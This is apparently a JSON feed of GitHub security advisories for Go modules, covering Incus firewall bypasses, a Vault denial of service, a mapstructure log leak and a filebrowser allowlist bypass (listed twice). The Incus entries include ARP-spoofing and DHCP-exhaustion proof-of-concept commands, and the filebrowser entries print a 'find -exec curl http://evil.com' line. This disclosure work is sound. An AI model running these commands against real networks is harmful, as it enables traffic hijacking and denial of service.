{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://xlordz.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using an ACL on a device connected to a bridge, Incus generates nftables rules that partially bypass security options <code>security.mac_filtering</code>, <code>security.ipv4_filtering</code> and <code>security.ipv6_filtering</code>. This can lead to ARP spoofing on the bridge and to fully spoof another VM/container on the same bridge.</p>\n<h3 id=\"details\">Details</h3>\n<p>In commit d137a063c2fe2a6983c995ba75c03731bee1557d, a few rules in the bridge input chain are moved to the top of the chain:</p>\n<pre><code>ct state established,related accept\n\niifname \"{{.hostName}}\" ether type arp accept\niifname \"{{.hostName}}\" ip6 nexthdr ipv6-icmp icmpv6 type { nd-neighbor-solicit, nd-neighbor-advert } accept\n</code></pre>\n<p>However, these rules accept packets that should be filtered and maybe dropped by later rules in the \"MAC filtering\", \"IPv4 filtering\" and \"IPv6 filtering\" snippets:</p>\n<pre><code>iifname \"{{.hostName}}\" ether type arp arp saddr ether != {{.hwAddr}} drop\niifname \"{{.hostName}}\" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop\n...\niifname \"{{.hostName}}\" ether type arp arp saddr ip != { {{.ipv4NetsList}} } drop\n...\niifname \"{{.hostName}}\" ether type ip6 icmpv6 type 136 {{.ipv6NetsPrefixList}} drop\n</code></pre>\n<p>Basically, the added rules partially bypass the security options <code>security.mac_filtering</code>, <code>security.ipv4_filtering</code> and <code>security.ipv6_filtering</code>. Doing so, they allow an attacker to perform ARP poisoning/spoofing attacks and send malicious Neighbor Advertisement (type 136).</p>\n<h3 id=\"poc\">PoC</h3>\n<p>With this terraform infrastructure:</p>\n<pre><code>resource \"incus_network_acl\" \"acl_allow_out\" {\n  name    = \"acl-allow-out\"\n  egress = [\n    {\n      action           = \"allow\"\n      destination      = \"0.0.0.0-9.255.255.255,11.0.0.0-172.15.255.255,172.32.0.0-192.167.255.255,192.169.0.0-255.255.255.254\"\n      state            = \"enabled\"\n    },\n  ]\n}\nresource \"incus_network_acl\" \"acl_allow_in\" {\n  name    = \"acl-allow-in\"\n  ingress = [\n    {\n      action           = \"allow\"\n      state            = \"enabled\"\n    },\n  ]\n}\n\nresource \"incus_network\" \"br0\" {\n  name = \"br0\"\n  config = {\n    \"ipv4.address\"          = \"10.0.0.1/24\"\n    \"ipv4.nat\"              = \"true\"\n  }\n}\n\nresource \"incus_instance\" \"machine1\" {\n  name  = \"machine1\"\n  image = \"images:archlinux/cloud\"\n  type = \"virtual-machine\"\n  config = {\n    \"limits.memory\" = \"2GiB\"\n    \"security.secureboot\" = false\n    \"boot.autostart\" = false\n    \"cloud-init.vendor-data\" = &lt;&lt;-EOF\n      #cloud-config\n      package_update: true\n      packages:\n        - dhclient\n        - tcpdump\n      runcmd:\n        - systemctl disable --now systemd.networkd.service\n        - systemctl disable --now systemd.networkd.socket\n    EOF\n  }\n  device {\n    type = \"disk\"\n    name = \"root\"\n    properties = {\n      pool = \"default\"\n      path = \"/\"\n      size = \"64GiB\"\n    }\n  }\n  device {\n    type = \"nic\"\n    name = \"eth0\"\n    properties = {\n      network = incus_network.br0.name\n      \"security.ipv4_filtering\" = true\n      \"security.acls\" = join(\",\",\n        [\n          incus_network_acl.acl_allow_out.name,\n          incus_network_acl.acl_allow_in.name,\n        ])\n    }\n  }\n}\n\nresource \"incus_instance\" \"machine2\" {\n  name  = \"machine2\"\n  image = \"images:archlinux/cloud\"\n  type = \"virtual-machine\"\n  config = {\n    \"limits.memory\" = \"2GiB\"\n    \"security.secureboot\" = false\n    \"boot.autostart\" = false\n  }\n  device {\n    type = \"disk\"\n    name = \"root\"\n    properties = {\n      pool = \"default\"\n      path = \"/\"\n      size = \"64GiB\"\n    }\n  }\n  device {\n    type = \"nic\"\n    name = \"eth0\"\n    properties = {\n      network = incus_network.br0.name\n    }\n  }\n}\n</code></pre>\n<p>An attacker in a VM (machine1) change their IP address to another VM (machine2)'s IP. The malicious change is reflected in the ARP table of the host, bypassing the MAC filtering. When the host emits or forwards a packet to machine2's IP, it is sent to machine1.\nIn addition, as <code>ct state established,related accept</code> is now the first rule in bridge chain input, machine1 can even answer and thus fully spoof the victim on the network.</p>\n<pre><code class=\"language-bash\">[HOST]$ ip n\n10.0.0.236 dev br0 lladdr 10:66:6a:88:e6:5b REACHABLE # machine2\n10.0.0.2 dev br0 lladdr 10:66:6a:89:39:45 REACHABLE # machine1\n\n# Spoof machine2\n[MACHINE1]$ ip add del 10.0.0.2/24 dev enp5s0\n[MACHINE1]$ ip add add 10.0.0.236/24 dev enp5s0\n\n# Flood\n[MACHINE1]$ arping 10.0.0.1\n\n# Machine2's IP refers to machine1's MAC in host ARP table\n[HOST]$ ip n\n10.0.0.236 dev br0 lladdr 10:66:6a:89:39:45 STALE\n\n# Packets from the host (or forwarded by the host) to machine2 ...\n[HOST]$ ping 10.0.0.236\nPING 10.0.0.236 (10.0.0.236) 56(84) bytes of data.\n64 bytes from 10.0.0.236: icmp_seq=1 ttl=64 time=1.19 ms\n\n# ... are sent to machine1!\n[MACHINE1]$ tcpdump -nei enp5s0\nlistening on enp5s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n15:15:17.008470 10:66:6a:99:e0:d8 &gt; 10:66:6a:89:39:45, ethertype IPv4 (0x0800), length 98: 10.0.0.1 &gt; 10.0.0.236: ICMP echo request, id 4, seq 1, length 64\n15:15:17.008513 10:66:6a:89:39:45 &gt; 10:66:6a:99:e0:d8, ethertype IPv4 (0x0800), length 98: 10.0.0.236 &gt; 10.0.0.1: ICMP echo reply, id 4, seq 1, length 64\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>All versions since d137a063c2fe2a6983c995ba75c03731bee1557d, so basically v6.12 and v6.13.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lxc/incus/security/advisories/GHSA-p7fw-vjjm-2rwp\">https://github.com/lxc/incus/security/advisories/GHSA-p7fw-vjjm-2rwp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52890\">https://nvd.nist.gov/vuln/detail/CVE-2025-52890</a></li>\n<li><a href=\"https://github.com/lxc/incus/commit/254dfd2483ab8de39b47c2258b7f1cf0759231c8\">https://github.com/lxc/incus/commit/254dfd2483ab8de39b47c2258b7f1cf0759231c8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p7fw-vjjm-2rwp\">https://github.com/advisories/GHSA-p7fw-vjjm-2rwp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p7fw-vjjm-2rwp",
            "title": "[github.com/lxc/incus/v6] Incus creates nftables rules that partially bypass security options",
            "date_modified": "2025-06-28T00:11:01.000Z",
            "date_published": "2025-06-26T21:12:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p7fw-vjjm-2rwp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using an ACL on a device connected to a bridge, Incus generates nftables rules for local services (DHCP, DNS...) that partially bypass security options <code>security.mac_filtering</code>, <code>security.ipv4_filtering</code> and <code>security.ipv6_filtering</code>. This can lead to DHCP pool exhaustion and opens the door for other attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>In commit a7c33301738aede3c035063e973b1d885d9bac7c, the following rules are added at the top of the bridge input chain:</p>\n<pre><code>iifname \"{{.hostName}}\" ether type ip ip saddr 0.0.0.0 ip daddr 255.255.255.255 udp dport 67 accept\niifname \"{{.hostName}}\" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::1:2 udp dport 547 accept\niifname \"{{.hostName}}\" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::2 icmpv6 type 133 accept\n</code></pre>\n<p>However, these rules accept packets that should be filtered and maybe dropped by later rules in the \"MAC filtering\" snippet:</p>\n<pre><code>iifname \"{{.hostName}}\" ether type arp arp saddr ether != {{.hwAddr}} drop\niifname \"{{.hostName}}\" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop\n</code></pre>\n<p>Therefore, the MAC filtering is ineffective on those new rules. This allows an attacker to request as many IP as they want by sending a lot of DHCP requests with different MAC addresses. Doing so, they can exhaust the DHCP pool, resulting in a DoS of the bridge's network.</p>\n<p>Additionaly, the commit adds non-restricted access to the local dnsmasq DNS server:</p>\n<pre><code>{{ if .dnsIPv4 }}\n{{ range .dnsIPv4 }}\niifname \"{{$.hostName}}\" ip daddr \"{{.}}\" tcp dport 53 accept\niifname \"{{$.hostName}}\" ip daddr \"{{.}}\" udp dport 53 accept\n{{ end }}\n{{ end }}\n\n{{ if .dnsIPv6 }}\n{{ range .dnsIPv6 }}\niifname \"{{$.hostName}}\" ip6 daddr \"{{.}}\" tcp dport 53 accept\niifname \"{{$.hostName}}\" ip6 daddr \"{{.}}\" udp dport 53 accept\n{{ end }}\n{{ end }}\n</code></pre>\n<p>An attacker can send DNS requests with arbitrary MAC and IP addresses as well. These rules should also be after the MAC/IPv4/IPv6 filtering.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>With this terraform infrastructure:</p>\n<pre><code>resource \"incus_network_acl\" \"acl_allow_out\" {\n  name    = \"acl-allow-out\"\n  egress = [\n    {\n      action           = \"allow\"\n      destination      = \"0.0.0.0-9.255.255.255,11.0.0.0-172.15.255.255,172.32.0.0-192.167.255.255,192.169.0.0-255.255.255.254\"\n      state            = \"enabled\"\n    },\n  ]\n}\nresource \"incus_network_acl\" \"acl_allow_in\" {\n  name    = \"acl-allow-in\"\n  ingress = [\n    {\n      action           = \"allow\"\n      state            = \"enabled\"\n    },\n  ]\n}\n\nresource \"incus_network\" \"br0\" {\n  name = \"br0\"\n  config = {\n    \"ipv4.address\"          = \"10.0.0.1/24\"\n    \"ipv4.nat\"              = \"true\"\n  }\n}\n\nresource \"incus_instance\" \"machine1\" {\n  name  = \"machine1\"\n  image = \"images:archlinux/cloud\"\n  type = \"virtual-machine\"\n  config = {\n    \"limits.memory\" = \"2GiB\"\n    \"security.secureboot\" = false\n    \"boot.autostart\" = false\n    \"cloud-init.vendor-data\" = &lt;&lt;-EOF\n      #cloud-config\n      package_update: true\n      packages:\n        - dhclient\n        - tcpdump\n      runcmd:\n        - systemctl disable --now systemd.networkd.service\n        - systemctl disable --now systemd.networkd.socket\n    EOF\n  }\n  device {\n    type = \"disk\"\n    name = \"root\"\n    properties = {\n      pool = \"default\"\n      path = \"/\"\n      size = \"64GiB\"\n    }\n  }\n  device {\n    type = \"nic\"\n    name = \"eth0\"\n    properties = {\n      network = incus_network.br0.name\n      \"security.ipv4_filtering\" = true\n      \"security.acls\" = join(\",\",\n        [\n          incus_network_acl.acl_allow_out.name,\n          incus_network_acl.acl_allow_in.name,\n        ])\n    }\n  }\n}\n\nresource \"incus_instance\" \"machine2\" {\n  name  = \"machine2\"\n  image = \"images:archlinux/cloud\"\n  type = \"virtual-machine\"\n  config = {\n    \"limits.memory\" = \"2GiB\"\n    \"security.secureboot\" = false\n    \"boot.autostart\" = false\n  }\n  device {\n    type = \"disk\"\n    name = \"root\"\n    properties = {\n      pool = \"default\"\n      path = \"/\"\n      size = \"64GiB\"\n    }\n  }\n  device {\n    type = \"nic\"\n    name = \"eth0\"\n    properties = {\n      network = incus_network.br0.name\n    }\n  }\n}\n</code></pre>\n<p>An attacker in a VM requests many IP addresses and exhaust the pool:</p>\n<pre><code class=\"language-bash\">[MACHINE1]$ for i in {0..99}; do for j in {0..99}; do ip link set address 10:66:6a:42:${i}:${j} dev enp5s0 ; dhclient -4 -i --no-pid ; done ; done\n\n[HOST]$ cat /var/lib/incus/networks/br0/dnsmasq.leases  |wc -l\n254\n\n[HOST]$ incus start machine2\n</code></pre>\n<p>At this point, machine2 will not receive a lease from dnsmasq until another lease expires. If machine1 renews their malicious leases, machine2 will never get a lease.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>All versions since a7c33301738aede3c035063e973b1d885d9bac7c, so basically v6.12 and v6.13.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lxc/incus/security/advisories/GHSA-9q7c-qmhm-jv86\">https://github.com/lxc/incus/security/advisories/GHSA-9q7c-qmhm-jv86</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52889\">https://nvd.nist.gov/vuln/detail/CVE-2025-52889</a></li>\n<li><a href=\"https://github.com/lxc/incus/commit/2516fb19ad8428454cb4edfe70c0a5f0dc1da214\">https://github.com/lxc/incus/commit/2516fb19ad8428454cb4edfe70c0a5f0dc1da214</a></li>\n<li><a href=\"https://github.com/lxc/incus/commit/a7c33301738aede3c035063e973b1d885d9bac7c\">https://github.com/lxc/incus/commit/a7c33301738aede3c035063e973b1d885d9bac7c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9q7c-qmhm-jv86\">https://github.com/advisories/GHSA-9q7c-qmhm-jv86</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9q7c-qmhm-jv86",
            "title": "[github.com/lxc/incus/v6] Incus Allocation of Resources Without Limits allows firewall rule bypass on managed bridge networks",
            "date_modified": "2025-06-28T00:09:13.000Z",
            "date_published": "2025-06-26T21:11:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9q7c-qmhm-jv86"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Vault Community and Vault Enterprise rekey and recovery key operations can lead to a denial of service due to uncontrolled cancellation by a Vault operator. This vulnerability (CVE-2025-4656) has been remediated in Vault Community Edition 1.20.0 and Vault Enterprise 1.20.0, 1.19.6, 1.18.11, 1.17.17, and 1.16.22.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-4656\">https://nvd.nist.gov/vuln/detail/CVE-2025-4656</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2025-11-vault-vulnerable-to-recovery-key-cancellation-denial-of-service/75570\">https://discuss.hashicorp.com/t/hcsec-2025-11-vault-vulnerable-to-recovery-key-cancellation-denial-of-service/75570</a></li>\n<li><a href=\"https://github.com/hashicorp/vault/pull/30794\">https://github.com/hashicorp/vault/pull/30794</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fhc2-8qx8-6vj7\">https://github.com/advisories/GHSA-fhc2-8qx8-6vj7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fhc2-8qx8-6vj7",
            "title": "[github.com/hashicorp/vault] Vault Community Edition rekey and recovery key operations can cause denial of service",
            "date_modified": "2025-06-27T21:43:30.000Z",
            "date_published": "2025-06-26T21:31:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fhc2-8qx8-6vj7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Use of this library in a security-critical context may result in leaking sensitive information, if used to process sensitive fields.</p>\n<h3 id=\"details\">Details</h3>\n<p>OpenBao (and presumably HashiCorp Vault) have surfaced error messages from <code>mapstructure</code> as follows:</p>\n<p><a href=\"https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab920/sdk/framework/field_data.go#L43-L50\">https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab920/sdk/framework/field_data.go#L43-L50</a></p>\n<pre><code class=\"language-go\">            _, _, err := d.getPrimitive(field, schema)\n            if err != nil {\n                return fmt.Errorf(\"error converting input for field %q: %w\", field, err)\n            }\n</code></pre>\n<p>where this calls <code>mapstructure.WeakDecode(...)</code>: <a href=\"https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab920/sdk/framework/field_data.go#L181-L193\">https://github.com/openbao/openbao/blob/98c3a59c040efca724353ca46ca79bd5cdbab920/sdk/framework/field_data.go#L181-L193</a></p>\n<pre><code class=\"language-go\">\nfunc (d *FieldData) getPrimitive(k string, schema *FieldSchema) (interface{}, bool, error) {\n    raw, ok := d.Raw[k]\n    if !ok {\n        return nil, false, nil\n    }\n\n    switch t := schema.Type; t {\n    case TypeBool:\n        var result bool\n        if err := mapstructure.WeakDecode(raw, &amp;result); err != nil {\n            return nil, false, err\n        }\n        return result, true, nil\n</code></pre>\n<p>Notably, <code>WeakDecode(...)</code> eventually calls one of the decode helpers, which surfaces the original value:</p>\n<p><a href=\"https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L679-L686\">https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L679-L686</a></p>\n<p><a href=\"https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L726-L730\">https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L726-L730</a></p>\n<p><a href=\"https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L783-L787\">https://github.com/go-viper/mapstructure/blob/1a66224d5e54d8757f63bd66339cf764c3292c21/mapstructure.go#L783-L787</a></p>\n<p>&amp; more.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To reproduce with OpenBao:</p>\n<pre><code>$ podman run -p 8300:8300 openbao/openbao:latest server -dev -dev-root-token-id=root -dev-listen-address=0.0.0.0:8300\n</code></pre>\n<p>and in a new tab:</p>\n<pre><code>$ BAO_TOKEN=root BAO_ADDR=http://localhost:8300 bao auth enable userpass\nSuccess! Enabled userpass auth method at: userpass/\n$ curl -X PUT -H \"X-Vault-Request: true\" -H \"X-Vault-Token: root\" -d '{\"password\":{\"asdf\":\"my-sensitive-value\"}}' \"http://localhost:8300/v1/auth/userpass/users/adsf\"\n{\"errors\":[\"error converting input for field \\\"password\\\": '' expected type 'string', got unconvertible type 'map[string]interface {}', value: 'map[asdf:my-sensitive-value]'\"]}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This is an information disclosure bug with little mitigation. See <a href=\"https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717\">https://discuss.hashicorp.com/t/hcsec-2025-09-vault-may-expose-sensitive-information-in-error-logs-when-processing-malformed-data-with-the-kv-v2-plugin/74717</a> for a previous version. That version was fixed, but this is in the second part of that error message (starting at <code>'' expected a map, got 'string'</code> -- when the field type is <code>string</code> and a <code>map</code> is provided, we see the above information leak -- the previous example had a <code>map</code> type field with a <code>string</code> value provided).</p>\n<p>This was rated 4.5 Medium by HashiCorp in the past iteration.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/go-viper/mapstructure/security/advisories/GHSA-fv92-fjc5-jj9h\">https://github.com/go-viper/mapstructure/security/advisories/GHSA-fv92-fjc5-jj9h</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fv92-fjc5-jj9h\">https://github.com/advisories/GHSA-fv92-fjc5-jj9h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fv92-fjc5-jj9h",
            "title": "[github.com/go-viper/mapstructure/v2] mapstructure May Leak Sensitive Information in Logs When Processing Malformed Data",
            "date_modified": "2025-06-27T16:24:59.000Z",
            "date_published": "2025-06-27T16:24:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fv92-fjc5-jj9h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The <em>Command Execution</em> feature of File Browser only allows the execution of shell command which have been predefined on a user-specific allowlist. Many tools allow the execution of arbitrary different commands, rendering this limitation void.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>The concrete impact depends on the commands being granted to the attacker, but the large number of standard commands allowing the execution of subcommands makes it likely that every user having the <code>Execute commands</code> permissions can exploit this vulnerability. Everyone who can exploit it will have full code execution rights with the <em>uid</em> of the server process.</p>\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n<p>Many Linux commands allow the execution of arbitrary different commands. For example, if a user is authorized to run only the <code>find</code> command and nothing else, this restriction can be circumvented by using the <code>-exec</code> flag.</p>\n<p>Some common commands having the ability to launch external commands and which are included in the official container image of Filebrowser are listed below. The website <a href=\"https://gtfobins.github.io\">https://gtfobins.github.io</a> gives a comprehensive overview:</p>\n<ul>\n<li><a href=\"https://gtfobins.github.io/gtfobins/cpio\">https://gtfobins.github.io/gtfobins/cpio</a></li>\n<li><a href=\"https://gtfobins.github.io/gtfobins/find\">https://gtfobins.github.io/gtfobins/find</a></li>\n<li><a href=\"https://gtfobins.github.io/gtfobins/sed\">https://gtfobins.github.io/gtfobins/sed</a></li>\n<li><a href=\"https://gtfobins.github.io/gtfobins/git\">https://gtfobins.github.io/gtfobins/git</a></li>\n<li><a href=\"https://gtfobins.github.io/gtfobins/env\">https://gtfobins.github.io/gtfobins/env</a></li>\n</ul>\n<p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<p>The following screenshot demonstrates, how this can be used to issue a network call to an external server:</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/02ef0833-79ee-40f7-87b8-bbb3fe102eab\"></p>\n<h2 id=\"recommended-countermeasures\">Recommended Countermeasures</h2>\n<p>Until this issue is fixed, we recommend to completely disable <code>Execute commands</code> for all accounts. Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application's configuration.</p>\n<p>The <code>prlimit</code> command can be used to prevent the execution of subcommands:</p>\n<pre><code class=\"language-bash\">$ find . -exec curl http://evil.com {} \\;\n&lt;HTML&gt;\n&lt;HEAD&gt;\n[...]\n\n$ prlimit --nproc=0 find . -exec curl http://evil.com {} \\;\nfind: cannot fork: Resource temporarily unavailable\n</code></pre>\n<p>It should be prepended to any command executed in the context of the application. <code>prlimit</code> can be used for containerized deployments as well as for bare-metal ones.</p>\n<p>WARNING: Note that this does prevent any unexpected behavior from the authorized command. For example, the <code>find</code> command can also delete files directly via its <code>-delete</code> flag.</p>\n<p>As a defense-in-depth measure, Filebrowser should provide an additional container image based on a <em>distroless</em> base image.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><code>2025-06-25</code> A patch version has been pushed to disable the feature for all existent installations, and making it <strong>opt-in</strong>. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on <a href=\"https://github.com/filebrowser/filebrowser/issues/5199\">https://github.com/filebrowser/filebrowser/issues/5199</a>.</li>\n<li><code>2025-03-26</code> Identified the vulnerability in version 2.32.0</li>\n</ul>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://manpages.debian.org/bookworm/util-linux/prlimit.1.en.html\">prlimit</a></li>\n<li><a href=\"https://github.com/GoogleContainerTools/distroless\">\"Distroless\" Container Images.</a></li>\n</ul>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Mathias Tausig (<a href=\"https://www.sba-research.org/\">SBA Research</a>)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4\">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52903\">https://nvd.nist.gov/vuln/detail/CVE-2025-52903</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/issues/5199\">https://github.com/filebrowser/filebrowser/issues/5199</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108\">https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3q2w-42mv-cph4\">https://github.com/advisories/GHSA-3q2w-42mv-cph4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3q2w-42mv-cph4",
            "title": "[github.com/filebrowser/filebrowser] filebrowser Allows Shell Commands to Spawn Other Commands",
            "date_modified": "2025-06-27T15:19:17.000Z",
            "date_published": "2025-06-27T15:19:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3q2w-42mv-cph4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The <em>Command Execution</em> feature of File Browser only allows the execution of shell command which have been predefined on a user-specific allowlist. Many tools allow the execution of arbitrary different commands, rendering this limitation void.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>The concrete impact depends on the commands being granted to the attacker, but the large number of standard commands allowing the execution of subcommands makes it likely that every user having the <code>Execute commands</code> permissions can exploit this vulnerability. Everyone who can exploit it will have full code execution rights with the <em>uid</em> of the server process.</p>\n<h2 id=\"vulnerability-description\">Vulnerability Description</h2>\n<p>Many Linux commands allow the execution of arbitrary different commands. For example, if a user is authorized to run only the <code>find</code> command and nothing else, this restriction can be circumvented by using the <code>-exec</code> flag.</p>\n<p>Some common commands having the ability to launch external commands and which are included in the official container image of Filebrowser are listed below. The website <a href=\"https://gtfobins.github.io\">https://gtfobins.github.io</a> gives a comprehensive overview:</p>\n<ul>\n<li><a href=\"https://gtfobins.github.io/gtfobins/cpio\">https://gtfobins.github.io/gtfobins/cpio</a></li>\n<li><a href=\"https://gtfobins.github.io/gtfobins/find\">https://gtfobins.github.io/gtfobins/find</a></li>\n<li><a href=\"https://gtfobins.github.io/gtfobins/sed\">https://gtfobins.github.io/gtfobins/sed</a></li>\n<li><a href=\"https://gtfobins.github.io/gtfobins/git\">https://gtfobins.github.io/gtfobins/git</a></li>\n<li><a href=\"https://gtfobins.github.io/gtfobins/env\">https://gtfobins.github.io/gtfobins/env</a></li>\n</ul>\n<p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<p>The following screenshot demonstrates, how this can be used to issue a network call to an external server:</p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/02ef0833-79ee-40f7-87b8-bbb3fe102eab\"></p>\n<h2 id=\"recommended-countermeasures\">Recommended Countermeasures</h2>\n<p>Until this issue is fixed, we recommend to completely disable <code>Execute commands</code> for all accounts. Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application's configuration.</p>\n<p>The <code>prlimit</code> command can be used to prevent the execution of subcommands:</p>\n<pre><code class=\"language-bash\">$ find . -exec curl http://evil.com {} \\;\n&lt;HTML&gt;\n&lt;HEAD&gt;\n[...]\n\n$ prlimit --nproc=0 find . -exec curl http://evil.com {} \\;\nfind: cannot fork: Resource temporarily unavailable\n</code></pre>\n<p>It should be prepended to any command executed in the context of the application. <code>prlimit</code> can be used for containerized deployments as well as for bare-metal ones.</p>\n<p>WARNING: Note that this does prevent any unexpected behavior from the authorized command. For example, the <code>find</code> command can also delete files directly via its <code>-delete</code> flag.</p>\n<p>As a defense-in-depth measure, Filebrowser should provide an additional container image based on a <em>distroless</em> base image.</p>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><code>2025-06-25</code> A patch version has been pushed to disable the feature for all existent installations, and making it <strong>opt-in</strong>. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on <a href=\"https://github.com/filebrowser/filebrowser/issues/5199\">https://github.com/filebrowser/filebrowser/issues/5199</a>.</li>\n<li><code>2025-03-26</code> Identified the vulnerability in version 2.32.0</li>\n</ul>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://manpages.debian.org/bookworm/util-linux/prlimit.1.en.html\">prlimit</a></li>\n<li><a href=\"https://github.com/GoogleContainerTools/distroless\">\"Distroless\" Container Images.</a></li>\n</ul>\n<h2 id=\"credits\">Credits</h2>\n<ul>\n<li>Mathias Tausig (<a href=\"https://www.sba-research.org/\">SBA Research</a>)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4\">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-3q2w-42mv-cph4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-52903\">https://nvd.nist.gov/vuln/detail/CVE-2025-52903</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/issues/5199\">https://github.com/filebrowser/filebrowser/issues/5199</a></li>\n<li><a href=\"https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108\">https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3q2w-42mv-cph4\">https://github.com/advisories/GHSA-3q2w-42mv-cph4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3q2w-42mv-cph4",
            "title": "[github.com/filebrowser/filebrowser/v2] filebrowser Allows Shell Commands to Spawn Other Commands",
            "date_modified": "2025-06-27T15:19:17.000Z",
            "date_published": "2025-06-27T15:19:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3q2w-42mv-cph4"
            },
            "tags": [
                "severity"
            ]
        },
        {
